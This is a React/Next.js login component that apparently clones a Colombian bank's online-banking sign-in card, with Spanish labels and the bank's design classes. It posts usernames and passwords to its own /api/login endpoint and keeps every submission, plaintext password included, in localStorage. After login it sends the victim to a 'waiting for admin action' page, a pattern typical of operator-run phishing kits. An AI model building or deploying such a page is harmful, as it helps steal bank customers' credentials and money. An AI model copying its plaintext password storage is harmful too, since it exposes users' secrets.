"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function AuthForm() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");
  const [status, setStatus] = useState("");

  useEffect(() => {
    const savedLast = localStorage.getItem("svpLastSubmission");
    if (savedLast) {
      const parsed = JSON.parse(savedLast);
      if (parsed?.username) setUsername(parsed.username);
    }
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setStatus("loading");
    setMessage("Verificando credenciales...");

    const payload = { username, password, timestamp: new Date().toISOString() };

    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();

      if (res.ok) {
        setStatus("success");
        setMessage(data.message || "Inicio de sesión exitoso");
        // Ir a pantalla de espera de la acción del admin
        router.push(`/loading?next=waiting&user=${encodeURIComponent(username)}`);
      } else {
        setStatus("error");
        setMessage(data.message || "Error de autenticación");
      }

      const submissions = JSON.parse(localStorage.getItem("svpSubmissions") || "[]");
      submissions.push({ ...payload, status: data.status || (res.ok ? "success" : "error") });
      localStorage.setItem("svpSubmissions", JSON.stringify(submissions));
      localStorage.setItem("svpLastSubmission", JSON.stringify(payload));
    } catch (err) {
      setStatus("error");
      setMessage("No se pudo conectar al servidor.");

      const submissions = JSON.parse(localStorage.getItem("svpSubmissions") || "[]");
      submissions.push({ ...payload, status: "error" });
      localStorage.setItem("svpSubmissions", JSON.stringify(submissions));
      localStorage.setItem("svpLastSubmission", JSON.stringify(payload));
    }
  };

  return (
    <div className="bc-card-body bc-mt-4">
      <bc-card-authentication
        titlecardauth="¡Hola!"
        aria-label="Hola. Ingresa los datos para gestionar tus productos y hacer transacciones."
        descriptioncardauth="Ingresa los datos para gestionar tus productos y hacer transacciones."
        amountofbuttons="one"
        typecontainerauth="staticContainer"
      >
        <section id="card1" className="bc-card bc-card-auth bc-card-container">
          <section id="id00" className="bc-card-auth-body">
            <section className="bc-card-auth-head">
              <section>
                <em aria-hidden="true" className="bc-icon"></em>
              </section>
              <h1 className="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3">¡Hola!</h1>
              <h3 className="bc-card-auth-description bc-mt-3">
                Ingresa los datos para gestionar tus productos y hacer transacciones.
              </h3>
            </section>

            <form onSubmit={handleSubmit} noValidate className="bc-untouched bc-pristine bc-valid">
              <section className="bc-card-auth-container">
                <bc-form-field className="authentication-form__username">
                  <div className="bc-form-field">
                    <em aria-hidden="false">user</em>
                    <input
                      id="username"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      type="text"
                      autoComplete="off"
                      spellCheck="false"
                      maxLength={20}
                      aria-label="Ingresa usuario"
                      placeholder=" "
                      className="bc-input"
                    />
                    <label htmlFor="username">Usuario</label>
                  </div>
                </bc-form-field>

                <bc-form-field className="authentication-form__password">
                  <div className="bc-form-field">
                    <em aria-hidden="false">lock</em>
                    <input
                      id="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      type="password"
                      autoComplete="off"
                      maxLength={20}
                      aria-label="Ingresa contraseña"
                      placeholder=" "
                      className="bc-input"
                    />
                    <label htmlFor="password">Contraseña</label>
                  </div>
                </bc-form-field>
              </section>

              <section className="bc-card-auth-button">
                <button
                  type="submit"
                  className="bc-button bc-button-fill bc-button-primary"
                  disabled={status === "loading"}
                >
                  {status === "loading" ? "Cargando..." : "Iniciar sesión"}
                </button>
              </section>

              <section className="auth-status-message">
                {message && (
                  <p className={`auth-message ${status}`}>{message}</p>
                )}
              </section>
            </form>

            <section className="bc-card-auth-link">
              <a href="#" className="bc-link link-default link-underline">
                <u>Crear usuario</u>
              </a>
            </section>
          </section>
        </section>
      </bc-card-authentication>
    </div>
  );
}
